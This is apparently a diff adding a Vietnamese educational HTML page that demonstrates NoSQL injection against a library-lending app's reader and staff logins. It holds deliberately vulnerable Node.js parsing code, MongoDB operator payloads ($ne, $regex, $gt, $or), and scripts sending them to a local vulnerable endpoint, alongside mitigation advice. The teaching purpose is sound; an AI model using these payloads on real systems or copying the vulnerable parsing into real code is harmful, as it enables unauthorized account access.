@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>NoSQL Injection Demo - Quản Lý Mượn Sách</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 20px;
+        background-color: #f5f5f5;
+      }
+      .container {
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+      h1 {
+        color: #d32f2f;
+        text-align: center;
+      }
+      h2 {
+        color: #1976d2;
+        border-bottom: 2px solid #1976d2;
+        padding-bottom: 5px;
+      }
+      .warning {
+        background-color: #fff3cd;
+        border: 1px solid #ffeaa7;
+        color: #856404;
+        padding: 15px;
+        border-radius: 5px;
+        margin: 20px 0;
+      }
+      .demo-section {
+        margin: 30px 0;
+        padding: 20px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        background-color: #f9f9f9;
+      }
+      .code-block {
+        background-color: #282c34;
+        color: #abb2bf;
+        padding: 15px;
+        border-radius: 5px;
+        font-family: "Courier New", monospace;
+        overflow-x: auto;
+        white-space: pre;
+      }
+      .payload {
+        background-color: #ffebee;
+        border-left: 4px solid #f44336;
+        padding: 10px;
+        margin: 10px 0;
+      }
+      .test-form {
+        background-color: #e3f2fd;
+        padding: 20px;
+        border-radius: 5px;
+        margin: 20px 0;
+      }
+      .test-form input,
+      .test-form textarea {
+        width: 100%;
+        padding: 10px;
+        margin: 5px 0;
+        border: 1px solid #ddd;
+        border-radius: 3px;
+      }
+      .test-form button {
+        background-color: #1976d2;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+      }
+      .test-form button:hover {
+        background-color: #1565c0;
+      }
+      .result {
+        margin-top: 15px;
+        padding: 10px;
+        border-radius: 3px;
+      }
+      .success {
+        background-color: #d4edda;
+        border: 1px solid #c3e6cb;
+        color: #155724;
+      }
+      .error {
+        background-color: #f8d7da;
+        border: 1px solid #f5c6cb;
+        color: #721c24;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>🚨 NoSQL Injection Demo - Quản Lý Mượn Sách</h1>
+
+      <div class="warning">
+        <strong>⚠️ CẢNH BÁO BẢO MẬT:</strong>
+        Đây là demo về lỗ hổng NoSQL Injection chỉ phục vụ mục đích giáo dục và
+        kiểm thử bảo mật. Không sử dụng trong môi trường production!
+      </div>
+
+      <h2>📝 Giới thiệu về NoSQL Injection</h2>
+      <p>
+        NoSQL Injection là một lỗ hổng bảo mật xảy ra khi ứng dụng không kiểm
+        tra và sanitize đầu vào từ người dùng trước khi sử dụng trong câu truy
+        vấn NoSQL. Điều này cho phép kẻ tấn công có thể bypass authentication
+        hoặc truy cập dữ liệu không được phép.
+      </p>
+
+      <h2>🔍 Phân tích lỗ hổng trong code</h2>
+      <div class="demo-section">
+        <h3>Code có lỗ hổng (login-vulnerable.js):</h3>
+        <div class="code-block">
+          // VULNERABLE: Parse JSON strings thành objects để cho phép injection
+          let parsedMaDocGia = MaDocGia; let parsedMatKhau = MatKhau; // Nếu
+          input là JSON string, parse thành object ❌ LỖ HỔNG! if (typeof
+          MaDocGia === 'string') { try { const parsed = JSON.parse(MaDocGia); if
+          (typeof parsed === 'object') { parsedMaDocGia = parsed; // ❌ Cho phép
+          MongoDB operators! } } catch (e) { // Không parse được thì giữ nguyên
+          string } } // Sử dụng parsed values trong query let queryCondition = {
+          MaDocGia: parsedMaDocGia, // ❌ Có thể chứa {"$ne": null} MatKhau:
+          parsedMatKhau // ❌ Có thể chứa {"$ne": null} }; const docGia = await
+          docGiaCollection.findOne(queryCondition);
+        </div>
+      </div>
+
+      <h2>💥 Các payload tấn công NoSQL Injection</h2>
+
+      <div class="demo-section">
+        <h3>1. Bypass Authentication - Bỏ qua xác thực</h3>
+        <div class="payload">
+          <strong>Payload cho MaDocGia:</strong><br />
+          <code>{"$ne": null}</code> hoặc <code>{"$exists": true}</code>
+          <br /><br />
+          <strong>Payload cho MatKhau:</strong><br />
+          <code>{"$ne": null}</code> hoặc <code>{"$exists": true}</code>
+        </div>
+        <p>
+          <strong>Giải thích:</strong> Payload này sẽ tạo query MongoDB như sau:
+        </p>
+        <div class="code-block">
+          db.docgias.findOne({ MaDocGia: {"$ne": null}, MatKhau: {"$ne": null}
+          })
+        </div>
+        <p>
+          Query này sẽ trả về bất kỳ user nào có MaDocGia và MatKhau khác null,
+          cho phép bypass authentication!
+        </p>
+      </div>
+
+      <div class="demo-section">
+        <h3>2. Regex Injection - Tấn công bằng regex</h3>
+        <div class="payload">
+          <strong>Payload cho MaDocGia:</strong><br />
+          <code>{"$regex": ".*"}</code>
+          <br /><br />
+          <strong>Payload cho MatKhau:</strong><br />
+          <code>{"$regex": ".*"}</code>
+        </div>
+        <p>
+          <strong>Giải thích:</strong> Regex ".*" sẽ match với mọi giá trị, cho
+          phép đăng nhập với bất kỳ user nào.
+        </p>
+      </div>
+
+      <div class="demo-section">
+        <h3>3. OR Injection - Tấn công bằng toán tử OR</h3>
+        <div class="payload">
+          <strong>Payload cho MaDocGia:</strong><br />
+          <code
+            >{"$or": [{"MaDocGia": {"$exists": true}}, {"Email": {"$exists":
+            true}}]}</code
+          >
+        </div>
+      </div>
+
+      <h2>🧪 Test NoSQL Injection</h2>
+
+      <div class="test-form">
+        <h3>Test đăng nhập độc giả với NoSQL Injection</h3>
+        <label>Mã độc giả (JSON payload):</label>
+        <textarea
+          id="readerUsername"
+          rows="3"
+          placeholder='Ví dụ: {"$ne": null}'
+        ></textarea>
+
+        <label>Mật khẩu (JSON payload):</label>
+        <textarea
+          id="readerPassword"
+          rows="3"
+          placeholder='Ví dụ: {"$ne": null}'
+        ></textarea>
+
+        <!-- Quick payload buttons -->
+        <div style="margin: 10px 0">
+          <strong>Payload nhanh:</strong>
+          <button
+            type="button"
+            onclick="setReaderPayload1()"
+            style="margin: 2px; padding: 5px; font-size: 12px"
+          >
+            $ne null
+          </button>
+          <button
+            type="button"
+            onclick="setReaderPayload2()"
+            style="margin: 2px; padding: 5px; font-size: 12px"
+          >
+            $exists true
+          </button>
+          <button
+            type="button"
+            onclick="setReaderPayload3()"
+            style="margin: 2px; padding: 5px; font-size: 12px"
+          >
+            $regex .*
+          </button>
+          <button
+            type="button"
+            onclick="setReaderPayload4()"
+            style="margin: 2px; padding: 5px; font-size: 12px"
+          >
+            $gt ""
+          </button>
+        </div>
+
+        <button onclick="testReaderLogin()">Test đăng nhập độc giả</button>
+
+        <div id="readerResult" class="result" style="display: none"></div>
+      </div>
+
+      <div class="test-form">
+        <h3>Test đăng nhập nhân viên với NoSQL Injection</h3>
+        <label>Tài khoản (JSON payload):</label>
+        <textarea
+          id="staffUsername"
+          rows="3"
+          placeholder='Ví dụ: {"$ne": null}'
+        ></textarea>
+
+        <label>Mật khẩu (JSON payload):</label>
+        <textarea
+          id="staffPassword"
+          rows="3"
+          placeholder='Ví dụ: {"$ne": null}'
+        ></textarea>
+
+        <!-- Quick payload buttons -->
+        <div style="margin: 10px 0">
+          <strong>Payload nhanh:</strong>
+          <button
+            type="button"
+            onclick="setStaffPayload1()"
+            style="margin: 2px; padding: 5px; font-size: 12px"
+          >
+            $ne null
+          </button>
+          <button
+            type="button"
+            onclick="setStaffPayload2()"
+            style="margin: 2px; padding: 5px; font-size: 12px"
+          >
+            $exists true
+          </button>
+          <button
+            type="button"
+            onclick="setStaffPayload3()"
+            style="margin: 2px; padding: 5px; font-size: 12px"
+          >
+            $regex .*
+          </button>
+          <button
+            type="button"
+            onclick="setStaffPayload4()"
+            style="margin: 2px; padding: 5px; font-size: 12px"
+          >
+            $gt ""
+          </button>
+        </div>
+
+        <button onclick="testStaffLogin()">Test đăng nhập nhân viên</button>
+
+        <div id="staffResult" class="result" style="display: none"></div>
+      </div>
+
+      <h2>🛡️ Cách phòng chống</h2>
+      <div class="demo-section">
+        <h3>1. Input Sanitization và Validation</h3>
+        <div class="code-block">
+          // Kiểm tra và chỉ chấp nhận string if (typeof MaDocGia !== 'string'
+          || typeof MatKhau !== 'string') { return res.status(400).json({
+          message: "Dữ liệu đầu vào không hợp lệ!" }); } // Sử dụng exact match
+          thay vì object injection const docGia = await
+          docGiaCollection.findOne({ MaDocGia: MaDocGia.toString(), // So sánh
+          mật khẩu đã hash bằng bcrypt });
+        </div>
+
+        <h3>2. Sử dụng Schema Validation</h3>
+        <div class="code-block">
+          const Joi = require('joi'); const loginSchema = Joi.object({ MaDocGia:
+          Joi.string().alphanum().min(3).max(30).required(), MatKhau:
+          Joi.string().min(6).required() }); const { error, value } =
+          loginSchema.validate(req.body); if (error) { return
+          res.status(400).json({ message: "Dữ liệu không hợp lệ: " +
+          error.details[0].message }); }
+        </div>
+
+        <h3>3. Sử dụng bcrypt để hash password</h3>
+        <div class="code-block">
+          // Hash password khi tạo tài khoản const hashedPassword = await
+          bcrypt.hash(password, 10); // So sánh password khi đăng nhập const
+          isValid = await bcrypt.compare(inputPassword, user.hashedPassword);
+        </div>
+      </div>
+
+      <h2>🔗 Tài nguyên tham khảo</h2>
+      <ul>
+        <li>
+          <a
+            href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
+            target="_blank"
+            >OWASP NoSQL Injection Testing Guide</a
+          >
+        </li>
+        <li>
+          <a
+            href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+            target="_blank"
+            >PayloadsAllTheThings - NoSQL Injection</a
+          >
+        </li>
+        <li>
+          <a
+            href="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb"
+            target="_blank"
+            >Hacking NodeJS and MongoDB</a
+          >
+        </li>
+      </ul>
+    </div>
+
+    <script>
+      const API_BASE = "http://localhost:5000/api";
+
+      async function testReaderLogin() {
+        const usernameInput = document
+          .getElementById("readerUsername")
+          .value.trim();
+        const passwordInput = document
+          .getElementById("readerPassword")
+          .value.trim();
+        const resultDiv = document.getElementById("readerResult");
+
+        try {
+          // Gửi trực tiếp string JSON, backend sẽ parse
+          console.log("Sending raw payload:", {
+            MaDocGia: usernameInput,
+            MatKhau: passwordInput,
+          });
+
+          const response = await fetch(`${API_BASE}/login-vulnerable/reader`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              MaDocGia: usernameInput,
+              MatKhau: passwordInput,
+            }),
+          });
+
+          const data = await response.json();
+
+          resultDiv.style.display = "block";
+          if (response.ok) {
+            resultDiv.className = "result success";
+            resultDiv.innerHTML = `
+                        <strong>✅ THÀNH CÔNG - NoSQL Injection hoạt động!</strong><br>
+                        Đăng nhập thành công với user: <strong>${
+                          data.user?.HoTen || "Unknown"
+                        }</strong><br>
+                        Mã độc giả: <strong>${
+                          data.user?.MaDocGia || "Unknown"
+                        }</strong><br>
+                        Email: <strong>${data.user?.Email || "N/A"}</strong><br>
+                        Token: ${data.token ? "Generated ✓" : "None"}
+                    `;
+          } else {
+            resultDiv.className = "result error";
+            resultDiv.innerHTML = `<strong>❌ THẤT BẠI:</strong> ${data.message}`;
+          }
+        } catch (error) {
+          resultDiv.style.display = "block";
+          resultDiv.className = "result error";
+          resultDiv.innerHTML = `<strong>❌ LỖI:</strong> ${error.message}`;
+        }
+      }
+
+      async function testStaffLogin() {
+        const usernameInput = document
+          .getElementById("staffUsername")
+          .value.trim();
+        const passwordInput = document
+          .getElementById("staffPassword")
+          .value.trim();
+        const resultDiv = document.getElementById("staffResult");
+
+        try {
+          // Gửi trực tiếp string JSON, backend sẽ parse
+          console.log("Sending raw payload:", {
+            TaiKhoan: usernameInput,
+            MatKhau: passwordInput,
+          });
+
+          const response = await fetch(`${API_BASE}/login-vulnerable/staff`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              TaiKhoan: usernameInput,
+              MatKhau: passwordInput,
+            }),
+          });
+
+          const data = await response.json();
+
+          resultDiv.style.display = "block";
+          if (response.ok) {
+            resultDiv.className = "result success";
+            resultDiv.innerHTML = `
+                        <strong>✅ THÀNH CÔNG - NoSQL Injection hoạt động!</strong><br>
+                        Đăng nhập thành công với user: <strong>${
+                          data.user?.HoTenNV || "Unknown"
+                        }</strong><br>
+                        MSNV: <strong>${
+                          data.user?.MSNV || "Unknown"
+                        }</strong><br>
+                        Chức vụ: <strong>${
+                          data.user?.ChucVu || "Unknown"
+                        }</strong><br>
+                        Role: <strong>${
+                          data.user?.role || "Unknown"
+                        }</strong><br>
+                        Token: ${data.token ? "Generated ✓" : "None"}
+                    `;
+          } else {
+            resultDiv.className = "result error";
+            resultDiv.innerHTML = `<strong>❌ THẤT BẠI:</strong> ${data.message}`;
+          }
+        } catch (error) {
+          resultDiv.style.display = "block";
+          resultDiv.className = "result error";
+          resultDiv.innerHTML = `<strong>❌ LỖI:</strong> ${error.message}`;
+        }
+      }
+
+      // Quick payload functions for readers
+      function setReaderPayload1() {
+        document.getElementById("readerUsername").value = '{"$ne": null}';
+        document.getElementById("readerPassword").value = '{"$ne": null}';
+      }
+
+      function setReaderPayload2() {
+        document.getElementById("readerUsername").value = '{"$exists": true}';
+        document.getElementById("readerPassword").value = '{"$exists": true}';
+      }
+
+      function setReaderPayload3() {
+        document.getElementById("readerUsername").value = '{"$regex": ".*"}';
+        document.getElementById("readerPassword").value = '{"$regex": ".*"}';
+      }
+
+      function setReaderPayload4() {
+        document.getElementById("readerUsername").value = '{"$gt": ""}';
+        document.getElementById("readerPassword").value = '{"$gt": ""}';
+      }
+
+      // Quick payload functions for staff
+      function setStaffPayload1() {
+        document.getElementById("staffUsername").value = '{"$ne": null}';
+        document.getElementById("staffPassword").value = '{"$ne": null}';
+      }
+
+      function setStaffPayload2() {
+        document.getElementById("staffUsername").value = '{"$exists": true}';
+        document.getElementById("staffPassword").value = '{"$exists": true}';
+      }
+
+      function setStaffPayload3() {
+        document.getElementById("staffUsername").value = '{"$regex": ".*"}';
+        document.getElementById("staffPassword").value = '{"$regex": ".*"}';
+      }
+
+      function setStaffPayload4() {
+        document.getElementById("staffUsername").value = '{"$gt": ""}';
+        document.getElementById("staffPassword").value = '{"$gt": ""}';
+      }
+
+      // Set default payloads
+      document.addEventListener("DOMContentLoaded", function () {
+        document.getElementById("readerUsername").value = '{"$ne": null}';
+        document.getElementById("readerPassword").value = '{"$ne": null}';
+        document.getElementById("staffUsername").value = '{"$ne": null}';
+        document.getElementById("staffPassword").value = '{"$ne": null}';
+      });
+    </script>
+  </body>
+</html>
